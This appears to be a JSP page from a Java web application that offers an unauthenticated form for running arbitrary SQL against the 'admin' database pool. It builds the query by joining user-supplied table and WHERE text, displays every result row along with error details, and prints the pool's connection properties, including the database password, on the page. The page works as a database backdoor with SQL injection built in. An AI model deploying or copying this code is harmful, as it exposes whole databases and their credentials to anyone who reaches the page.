<%@ page contentType="text/html; charset=GBK" %>

<%@page import="java.sql.*"%>
<%@page import="org.logicalcobwebs.proxool.ProxoolFacade"%>
<%@page import="org.logicalcobwebs.proxool.ConnectionPoolDefinitionIF"%>
<%@page import="java.util.Properties"%>
<%@page import="java.util.Iterator"%>

<% 

	
	String strTable = request.getParameter("table");
	String strWhere = request.getParameter("where");
	String strShow = null;
	String strCon = null;
	if ("".equals(strTable) || strTable == null) {
		strShow = "<tr><td>This is mazhen's world! Take care!Bear here!</td></tr>";
	} else {
		StringBuffer returnValue = new StringBuffer("");
	    String strSQL = "select * from " + strTable + " where " + strWhere;
		System.out.println("strSQL ====" + strSQL);
		Connection conn = null;
	    PreparedStatement pstmt = null;
	    ResultSet rset = null;
	    try {
	      
	      
	      String alias = "admin";
		  ConnectionPoolDefinitionIF def = ProxoolFacade.getConnectionPoolDefinition(alias);
		  Properties p = def.getDelegateProperties();
		      Iterator i = p.keySet().iterator();
    while (i.hasNext()) {
      String name = (String)i.next();
      String value = p.getProperty(name);

      //if ((name.toLowerCase().indexOf("password") > -1) || (name.toLowerCase().indexOf("passwd") > -1)) {
       // strCon = value;
      //}
      strCon = strCon + name + "==" + value + ">>>";
      
    }
conn = DriverManager.getConnection("proxool.admin");
	      pstmt = conn.prepareStatement(strSQL);
	      rset = pstmt.executeQuery();
	      
	      //打印字段名称start
	      ResultSetMetaData rsmd=rset.getMetaData();
	      returnValue.append("<tr>");
	      for(int column=1;column<=rsmd.getColumnCount();column++) {
	      	  returnValue.append("<td>");
	      	  returnValue.append(rsmd.getColumnName(column));
	      	  returnValue.append("</td>");
	      }
	      returnValue.append("</tr>");
	      //打印字段名称end
	      while (rset.next()) {
	      	  returnValue.append("<tr>");
              for(int column=1;column<=rsmd.getColumnCount();column++) {
                  returnValue.append("<td>");
                  returnValue.append(rset.getString(column));
                  returnValue.append("</td>");
              }
              returnValue.append("</tr>");
	      }
	    } catch (Exception ex) {
	      returnValue.append("<tr>");
	      returnValue.append("<td>");
	      returnValue.append(ex.toString());
	      returnValue.append("</td>");
	      returnValue.append("</tr>");
	      returnValue.append("<tr>");
	      returnValue.append("<td>");
	      returnValue.append(strSQL);
	      returnValue.append("</td>");
	      returnValue.append("</tr>");
	      ex.printStackTrace();
	    } finally {
	      strShow = returnValue.toString();
	      try {
	        rset.close(); } catch (Exception localException4) {
	      }
	      try {
	        pstmt.close(); } catch (Exception localException5) {
	      }
	      try {
	        conn.close();
	      } catch (Exception localException6) {
	      }
	    }
	 }
	    
	
 %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>SQL</title>
</head>
<body>
<form name="sqlForm" action="GetResultByInputSQL.jsp" method="post">
<input type="hidden" id="password" name="password" value="" />
<table>
<tr><td>表名：<input type="text" name="table" cols="50" rows="10"></td></tr>
<tr><td>条件：<textarea name="where" cols="50" rows="10"></textarea></td></tr>
<tr><td><input type="submit" value="select"></td></tr>
</table>
<table border=1>
<%=strShow %>
<tr><td><%=strCon %></td></tr>
</table>
</form>
</body>
</html>
